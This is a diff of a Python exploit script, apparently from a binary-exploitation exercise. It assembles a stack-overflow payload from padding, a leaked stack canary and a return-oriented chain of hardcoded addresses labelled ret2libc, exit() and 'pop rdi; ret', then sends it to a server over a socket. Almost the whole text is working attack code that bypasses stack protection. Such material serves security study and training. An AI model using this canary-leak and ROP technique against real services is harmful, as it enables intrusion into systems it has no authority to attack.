@@ -40,9 +40,9 @@ binadd = open('tmp', 'r').read()
 binadd = binadd.split(':')
 #print(binadd[1].strip())
 
-print(canary)
+#print(canary)
 canary.reverse()
-print(canary)
+#print(canary)
 canary_str = ''
 for c in range(8):
 	#print(canary[c])
@@ -61,18 +61,24 @@ filename = 'leaked_data.txt'
 with open(filename, 'w') as file_object:
     file_object.write(write_to_file)
 
-strg = b'\xea\x4a\x55\x55\x55\x55\x00\x00' #die()
-#strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' #exit()
-strg+= b'pawned!\0'
-strg+= b'' #pop rdi; ret
-
+strg = b'pawned!\0' # pawned!
+strg+= b'AAAAAAAA'  # AAAAAAAA
+strg+= b'BBBBBBBB'  # BBBBBBBB
+# canary
 for c in range(8):
-	strg += struct.pack('B',b_canary[c])
+        strg += struct.pack('B',b_canary[c])
+strg+= b'\xde\xad\xbe\xef\x00\x00\x00\x00' # deadbeef
+strg+= b'\xf0\xe4\xff\xff\xff\x7f\x00\x00' # ret2libc
+#strg+= b'\xea\x4a\x55\x55\x55\x55\x00\x00' # die()
+strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' # exit()
+strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' # exit()
+strg+= b'\x33\x0f\x00\x00\x00\x00\x00\x00' # pop rdi; ret
+strg+= b'\xc0\xe4\xff\xff\xff\x7f\x00\x00' # string address
 
 #send string and length to server
 #s.connect(sock)
-strg += b'\n64\n'
-print(strg)
+strg += b'\n88\n'
+#print(strg)
 s.send(strg)
 data = s.recv(1024)
 s.close()
